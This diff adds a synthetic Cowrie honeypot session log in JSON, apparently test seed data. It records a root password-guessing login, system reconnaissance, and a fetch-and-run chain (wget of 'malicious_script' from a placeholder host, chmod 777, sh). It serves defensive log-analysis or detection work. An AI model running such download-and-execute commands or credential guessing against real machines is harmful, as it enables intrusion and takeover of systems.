@@ -1,0 +1,20 @@
+{
+  "session": "seed-botnet-01",
+  "src_ip": "185.220.101.44",
+  "src_port": 51234,
+  "events": [
+    { "offset": 0, "eventid": "cowrie.session.connect", "dst_port": 2222 },
+    { "offset": 2, "eventid": "cowrie.login.failed", "username": "root", "password": "admin" },
+    { "offset": 3, "eventid": "cowrie.login.failed", "username": "root", "password": "root" },
+    { "offset": 5, "eventid": "cowrie.login.success", "username": "root", "password": "123456" },
+    { "offset": 8, "eventid": "cowrie.command.input", "input": "uname -a" },
+    { "offset": 11, "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo" },
+    { "offset": 14, "eventid": "cowrie.command.input", "input": "free -m" },
+    { "offset": 17, "eventid": "cowrie.command.input", "input": "cd /tmp" },
+    { "offset": 20, "eventid": "cowrie.command.input", "input": "wget http://198.51.100.7/malicious_script" },
+    { "offset": 24, "eventid": "cowrie.session.file_download", "url": "http://198.51.100.7/malicious_script", "outfile": "malicious_script", "shasum": "9f2b1c4e8a7d6053f1e2b9c8a7d6e5f4b3a2918077665544332211aabbccddee" },
+    { "offset": 26, "eventid": "cowrie.command.input", "input": "chmod 777 malicious_script" },
+    { "offset": 29, "eventid": "cowrie.command.input", "input": "sh malicious_script" },
+    { "offset": 33, "eventid": "cowrie.session.closed" }
+  ]
+}
